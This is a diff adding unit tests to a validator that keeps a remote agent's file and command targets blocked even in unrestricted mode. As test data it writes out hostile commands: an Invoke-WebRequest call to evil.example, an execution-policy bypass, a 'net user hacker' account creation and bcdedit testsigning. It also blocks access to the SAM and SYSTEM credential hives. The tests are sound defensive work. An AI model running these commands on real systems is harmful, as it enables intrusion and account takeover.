@@ -158,6 +158,17 @@ describe("validateFileTarget", () => {
     );
     expect(r.allowed).toBe(false);
   });
+
+  // Mirrors the agent's AdditionalHardBlockedPathPrefixes (SAM/SECURITY/SYSTEM hives).
+  it("blocks C:\\Windows\\System32\\config even in unrestricted mode", () => {
+    expect(validateFileTarget("C:\\Windows\\System32\\config\\SAM", false).allowed).toBe(false);
+    expect(validateFileTarget("C:\\Windows\\System32\\config\\SAM", true).allowed).toBe(false);
+  });
+
+  it("does not block sibling System32 paths outside \\config", () => {
+    const r = validateFileTarget("C:\\Windows\\System32\\configX\\file.log", true);
+    expect(r.allowed).toBe(true);
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -254,6 +265,33 @@ describe("validateCommandTarget", () => {
     const r = validateCommandTarget("", false);
     expect(r.allowed).toBe(false);
   });
+
+  // Hard guards mirror GatherRuleGuards.IsCommandAllowed: they apply even in
+  // unrestricted mode — the agent blocks these on-device regardless, and the
+  // portal badge must never show "Allowed" for them.
+  it.each([
+    "Invoke-WebRequest -Uri https://evil.example/x",
+    "invoke-webrequest -uri https://evil.example/x",
+    "Get-Tpm; Set-ExecutionPolicy Bypass",
+    "cmd /c net user hacker P@ss /add",
+    "bcdedit /set testsigning on",
+  ])("blocks hard-blocked pattern even in unrestricted mode: %s", (cmd) => {
+    expect(validateCommandTarget(cmd, false).allowed).toBe(false);
+    const unrestricted = validateCommandTarget(cmd, true);
+    expect(unrestricted.allowed).toBe(false);
+    expect(unrestricted.unrestricted).toBe(false);
+  });
+
+  it("blocks over-length command even in unrestricted mode", () => {
+    const longCmd = "Get-Something " + "a".repeat(2100);
+    expect(validateCommandTarget(longCmd, false).allowed).toBe(false);
+    expect(validateCommandTarget(longCmd, true).allowed).toBe(false);
+  });
+
+  it("still allows allowlisted commands containing no blocked pattern", () => {
+    // "certutil -store My" must not be caught by the "certutil -urlcache" pattern.
+    expect(validateCommandTarget("certutil -store My", false).allowed).toBe(true);
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -340,6 +378,15 @@ describe("validateDiagnosticsPath", () => {
       false,
     );
     expect(r.allowed).toBe(false);
+  });
+
+  it("blocks C:\\Windows\\System32\\config even in unrestricted mode", () => {
+    expect(validateDiagnosticsPath("C:\\Windows\\System32\\config\\SYSTEM", true).allowed).toBe(false);
+  });
+
+  it("still allows the winevt log directory next to \\config", () => {
+    const r = validateDiagnosticsPath("C:\\Windows\\System32\\winevt\\Logs\\System.evtx", false);
+    expect(r.allowed).toBe(true);
   });
 });
 
